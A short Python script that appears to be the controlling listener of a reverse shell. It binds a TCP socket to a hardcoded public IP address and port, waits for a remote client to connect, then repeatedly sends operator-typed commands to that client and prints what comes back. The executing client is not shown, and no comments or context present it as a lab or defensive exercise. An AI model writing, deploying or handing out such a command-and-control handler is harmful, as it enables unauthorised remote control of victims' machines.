import socket

HOST = '162.216.17.32'
PORT = 42356

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))

server.listen()

client, address = server.accept()

print(f"Connected to {address}.")
while True:
    cmd_input = input("COMMAND: ")
    client.send(cmd_input.encode('utf-8'))
    print(client.recv(1024).decode('utf-8'))
